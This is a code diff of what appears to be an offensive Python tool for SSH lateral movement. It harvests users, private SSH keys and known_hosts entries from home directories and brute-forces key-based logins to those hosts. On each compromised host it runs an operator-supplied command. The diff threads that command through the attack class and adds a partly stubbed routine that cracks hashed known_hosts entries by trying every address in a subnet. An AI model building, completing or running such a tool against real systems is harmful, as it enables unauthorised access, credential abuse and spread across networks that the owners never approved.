@@ -28,6 +28,7 @@ import os
 import sys
 import threading
 import argparse
+import ipaddress
 
 try: 
     import queue as queue
@@ -40,13 +41,13 @@ knownHosts     = []
 success        = []
 users          = []
 sshKeys        = []
-CMD            = ""
+
    
-class WorkerThread(threading.Thread) :
+class SSHThread(threading.Thread) :
  
-	def __init__(self, queue, tid, credentials) :
+	def __init__(self, q, tid, credentials, CMD="") :
 		threading.Thread.__init__(self)
-		self.queue = queue
+		self.queue = q
 		self.tid = tid
 		self.credentials = credentials
  
@@ -56,7 +57,7 @@ class WorkerThread(threading.Thread) :
 			try :
 				host = self.queue.get(timeout=1)
  
-			except 	Queue.Empty :
+			except 	queue.Empty :
 				return
  
 			
@@ -79,25 +80,56 @@ class WorkerThread(threading.Thread) :
  
 			self.queue.task_done()
 
+
+class CrackThread(threading.Thread) :
+ 
+	def __init__(self, q, tid, ips, magic, salt, hashed) :
+		threading.Thread.__init__(self)
+		self.queue  = q
+		self.tid    = tid
+		self.ips    = ips
+		self.magic  = magic
+		self.salt   = salt
+		self.hashed = hashed
+
+ 
+	def run(self) :
+		while True :
+			host = None 
+			try :
+				host = self.queue.get(timeout=1)
+ 
+			except 	queue.Empty :
+				return
+ 
+			
+				# TODO
+ 
+ 
+			self.queue.task_done()
+
+
 class attack(object):
 
+	def __init__(self, cmd):
+		self.cmd = cmd
 
 	def run(self):
 
-		queue       = Queue.Queue()
-		credentials = Queue.Queue()
+		q           = queue.Queue()
+		credentials = queue.Queue()
 
 		threads = []
 		for i in range(1, len(knownHosts)) : # Number of threads
-			worker = WorkerThread(queue, i, credentials) 
+			worker = SSHThread(q, i, credentials, self.cmd) 
 			worker.setDaemon(True)
 			worker.start()
 			threads.append(worker)
 
 		for host in knownHosts:
-			queue.put(host)
+			q.put(host)
 
-		queue.join()
+		q.join()
 		 
 		# wait for all threads to exit 
 		if not credentials.empty():
@@ -110,6 +142,47 @@ class attack(object):
 
 		return out[0], out[1] # Output attack: user, host
 
+
+
+
+
+class crack_host(object):
+
+	def __init__(self, host_string, subnet):
+		""" crack an encrypted known host """
+
+		self.magic  = host_string.split("|")[0]
+		self.salt   = host_string.split("|")[1]
+		self.hashed = host_string.split("|")[2]
+		self.subnet = ipaddress.ip_network(subnet)
+
+	def run(self):
+
+		q           = queue.Queue()
+		ips         = queue.Queue()
+
+		threads = []
+		for i in range(1, 4) : # Number of threads
+			worker = CrackThread(q, i, ips, self.magic, self.salt, self.hashed) 
+			worker.setDaemon(True)
+			worker.start()
+			threads.append(worker)
+
+		for host in self.subnet.hosts():
+			q.put(str(host))
+
+		q.join()
+		 
+		# wait for all threads to exit 
+		if not ips.empty():
+			out = (ips.get()).split(":")
+		else:
+			return False
+		 
+		for item in threads :
+			item.join()
+
+		return out[0], out[1] # Output attack: user, host
 
 def discovery(args):
 	# Search users, SSH keys and known hosts
@@ -147,10 +220,12 @@ def discovery(args):
 
 								if args.crack != "":
 									# crack the hashed known hosts
-									sys.stdout.write ("TODO")#+host)
+									sys.stdout.write ("\033[92m[*]\033[0m Cracking known host on %s/.ssh/known_hosts...\033[0m\n" % home )
+									crack_host(host, args.crack)
+									sys.stdout.write ("\033[92m[*]\033[0m done.\n")
 
 						if encrypted_knownhosts and args.crack == "":
-							sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home + "/.ssh/known_hosts\033[0m\n")
+							sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s/.ssh/known_hosts\033[0m\n" % home )
 							sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m--crack\033[0m flag to break it\n")
 
 
@@ -191,16 +266,19 @@ def discovery(args):
 
 						if args.crack != "":
 							# crack the hashed known hosts
-							sys.stdout.write ("TODO")#+host)
+							sys.stdout.write ("\033[92m[*]\033[0m Cracking known host on %s/.ssh/known_hosts...\033[0m\n" % home )
+							crack_host(host, args.crack)
+							sys.stdout.write ("\033[92m[*]\033[0m done.\n")
 
 
 				if encrypted_knownhosts and args.crack == "":
-						sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % args.home + homes + "/.ssh/known_hosts\033[0m\n")
+						sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s/.ssh/known_hosts\033[0m\n" % args.home )
 						sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m%s--crack\033[0m flag to break it\n")
 
 				FK.close()
 	
 	return True
+
 
 
 if __name__ == "__main__":
@@ -258,8 +336,7 @@ if __name__ == "__main__":
 			sys.stdout.write ("\t"+host)
 
 	sys.stdout.write ("\n\033[92m[*]\033[0m Starting keys bruteforcing...\n")
-	CMD = args.run
-	Attack = attack()
+	Attack = attack(args.run)
 
 	Attack.run()
 	sys.stdout.write ("\033[92m[*]\033[0m Attack Complete!\n")
